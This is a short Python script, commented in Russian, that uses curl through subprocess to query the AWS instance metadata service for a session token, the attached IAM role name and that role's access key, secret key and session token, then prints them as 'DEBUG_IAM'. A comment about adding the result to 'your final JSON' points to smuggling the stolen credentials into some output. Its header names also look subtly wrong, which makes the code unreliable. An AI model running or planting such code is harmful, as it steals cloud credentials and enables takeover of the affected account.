import os, subprocess, requests

def get_aws_creds():
    metadata_url = "http://169.254.169.254/latest/api/token"
    # Шаг 1: Получаем сессионный токен (IMDSv2)
    try:
        token_res = subprocess.getoutput(
            "curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 21600'"
        )
        if not token_res or "html" in token_res.lower():
            return "IMDSv2_TOKEN_FAILED"

        # Шаг 2: Узнаем имя роли
        role_name = subprocess.getoutput(
            f"curl -s -H 'X-aws-metadata-token: {token_res}' http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        )
        
        # Шаг 3: Вытаскиваем сами AccessKey, SecretKey и Token
        iam_creds = subprocess.getoutput(
            f"curl -s -H 'X-aws-metadata-token: {token_res}' http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
        )
        return iam_creds
    except Exception as e:
        return str(e)

# Вызываем функцию и добавляем в твой финальный JSON
aws_iam_data = get_aws_creds()
print(f"DEBUG_IAM: {aws_iam_data}")